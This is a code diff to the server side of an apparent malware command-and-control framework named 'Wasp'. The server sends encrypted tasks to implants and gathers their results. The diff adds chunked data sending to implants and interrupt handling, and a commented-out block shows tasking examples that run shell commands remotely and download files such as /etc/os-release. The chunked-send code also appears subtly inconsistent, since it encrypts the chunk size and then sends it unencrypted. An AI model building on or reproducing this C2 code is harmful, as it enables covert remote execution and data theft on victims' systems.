@@ -9,6 +9,7 @@ from enum import Enum
 import socketserver
 import random
 import base64
+import time
 
 from pathlib import Path
 
@@ -17,8 +18,8 @@ from typing import Dict, List, Optional
 import logging
 
 from constants import WASP_HOME, WASPS_PATH, logger
-from wasp_types import WaspException, WaspMalware, WaspCommand, WaspResponse
-from wasp_commands import WaspCommandExecute, WaspCommandFileList, WaspCommandDownload, WaspCommandHandshake
+from wasp_types import WaspException, WaspMalware, WaspCommand, WaspResponse, WaspCommandChunked
+from wasp_commands import WaspCommandHandshake
 
 
 # This is used in the "Handshake" method to authenticate between clients and servers
@@ -74,31 +75,35 @@ class WaspServer(socketserver.BaseRequestHandler):
         #t = threading.Thread(target=self.run_receive_thread)
         #t.start()
 
-        while self.wasp.has_tasks():
-            commands: List[WaspCommand] = self.wasp.get_tasks()
+        try:
+            while self.wasp.has_tasks():
+                commands: List[WaspCommand] = self.wasp.get_tasks()
 
-            """
-            # TODO: Write integration tests!
-            commands.append(WaspCommandExecute(self.wasp, '/bin/touch /tmp/hello'))
-            commands.append(WaspCommandExecute(self.wasp, '/bin/echo wasp > /tmp/hello'))
-            commands.append(WaspCommandExecute(self.wasp, 'ln -s /tmp/hello /tmp/goodbye'))
-            commands.append(WaspCommandExecute(self.wasp, 'mkdir /tmp/a_dir'))
-            commands.append(WaspCommandExecute(self.wasp, 'cat /etc/os-release > /tmp/os-release'))
-            commands.append(WaspCommandFileList(self.wasp, '/tmp'))
-            commands.append(WaspCommandDownload(self.wasp, '/tmp/hello'))
-            commands.append(WaspCommandDownload(self.wasp, '/bin/ls'))
-            commands.append(WaspCommandDownload(self.wasp, '/tmp/os-release'))
-            commands.append(WaspCommandDownload(self.wasp, '/etc/os-release'))
-            commands.append(WaspCommandExecute(self.wasp, '/bin/echo after listing'))
-            """
+                """
+                # TODO: Write integration tests!
+                commands.append(WaspCommandExecute(self.wasp, '/bin/touch /tmp/hello'))
+                commands.append(WaspCommandExecute(self.wasp, '/bin/echo wasp > /tmp/hello'))
+                commands.append(WaspCommandExecute(self.wasp, 'ln -s /tmp/hello /tmp/goodbye'))
+                commands.append(WaspCommandExecute(self.wasp, 'mkdir /tmp/a_dir'))
+                commands.append(WaspCommandExecute(self.wasp, 'cat /etc/os-release > /tmp/os-release'))
+                commands.append(WaspCommandFileList(self.wasp, '/tmp'))
+                commands.append(WaspCommandDownload(self.wasp, '/tmp/hello'))
+                commands.append(WaspCommandDownload(self.wasp, '/bin/ls'))
+                commands.append(WaspCommandDownload(self.wasp, '/tmp/os-release'))
+                commands.append(WaspCommandDownload(self.wasp, '/etc/os-release'))
+                commands.append(WaspCommandExecute(self.wasp, '/bin/echo after listing'))
+                """
 
-            for command in commands:
-                self.send_command(command)
-                response = self.receive_result()
-                if response:
-                    command.submit_response(response)
-                    command.mark_complete()
-        self.logger.info(f"No more tasks for {self.wasp}")
+                for command in commands:
+                    self.send_command(command)
+                    response = self.receive_result()
+                    if response:
+                        command.submit_response(response)
+                        command.mark_complete()
+            self.logger.info(f"No more tasks for {self.wasp}")
+        except KeyboardInterrupt:
+            self.logger.warning(f"Terminating connection to {self.wasp} at user request")
+            time.sleep(3) 
 
     def handshake_from_wasp(self) -> WaspMethod:
         # Get config from wasp
@@ -167,6 +172,11 @@ class WaspServer(socketserver.BaseRequestHandler):
         packed = command.pack()
         encrypted = self.cipher_to_wasp.cipher(packed)
         self.request.sendall(encrypted)
+
+        if isinstance(command, WaspCommandChunked):
+            chunked_command: WaspCommandChunked = command
+            self.send_chunks(chunked_command.get_data())
+
         self.logger.info(f"Tasked")
 
     def receive_result(self) -> Optional[WaspResponse]:
@@ -225,6 +235,34 @@ class WaspServer(socketserver.BaseRequestHandler):
             raw_response = self.cipher_from_wasp.cipher(encrypted_response)
             self.logger.info(f"Raw response: {raw_response}")
             received_bytes += raw_response
+
+    def send_chunks(self, data: bytes):
+        self.logger.debug(f"In chunked encoding mode")
+        chunk_size = 255 # Maximum is ushort
+        remaining: bytes = data
+        while len(remaining) > 0:
+            chunk = remaining[:chunk_size]
+            remaining = remaining[chunk_size:]
+            self.logger.debug(f"Sending chunk of size {len(chunk)}")
+
+            # Make sure we send the correct chunk size here, we will throw and exception
+            # if it does not fit into a short
+            chunk_size_packed = struct.pack('!H', len(chunk))
+            chunk_size_encrypted = self.cipher_to_wasp.cipher(chunk_size_packed)
+            self.request.sendall(chunk_size_packed)
+
+            encrypted_chunk = self.cipher_to_wasp.cipher(chunk)
+            self.request.sendall(encrypted_chunk)
+
+        self.logger.debug(f"Sending termination chunk")
+        chunk_size_packed = struct.pack('!H', 0)
+        encrypted_chunk = self.cipher_to_wasp.cipher(chunk_size_packed)
+        self.request.sendall(encrypted_chunk)
+
+
+
+
+
 
 
 if __name__ == '__main__':
